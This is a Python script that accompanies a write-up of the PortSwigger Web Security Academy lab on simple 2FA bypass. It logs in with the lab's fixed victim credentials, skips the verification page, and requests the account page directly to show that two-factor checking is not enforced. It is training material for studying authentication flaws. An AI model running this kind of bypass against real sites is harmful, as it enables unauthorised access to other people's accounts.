#!/usr/bin/env python3
"""
2FA simple bypass
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 07-2fa-simple-bypass.md

What this does:
    Logs in with the victim credentials this specific lab provides
    (carlos:montoya -- a fixed account PortSwigger hands out for this lab, not a
    per-instance secret) and, instead of following the app to the /login2
    verification page, issues a plain GET /my-account on the same session. The
    server marks the session authenticated as soon as the password check passes,
    so the 2FA page turns out to be an unenforced UI step rather than a real
    authorization gate.

Usage:
    python 07-2fa-simple-bypass.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

VICTIM_USER = "carlos"
VICTIM_PASS = "montoya"


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    page = client.get(f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": VICTIM_USER, "password": VICTIM_PASS
    })

    resp = client.get(f"{lab_url}/my-account")
    print(f"[*] Direct /my-account after password login: {resp.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- 2FA step skipped entirely.")
        return

    # Fallback the original wrapper also tried.
    resp = client.get(f"{lab_url}/my-account?id={VICTIM_USER}")
    print(f"[*] /my-account?id={VICTIM_USER}: {resp.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
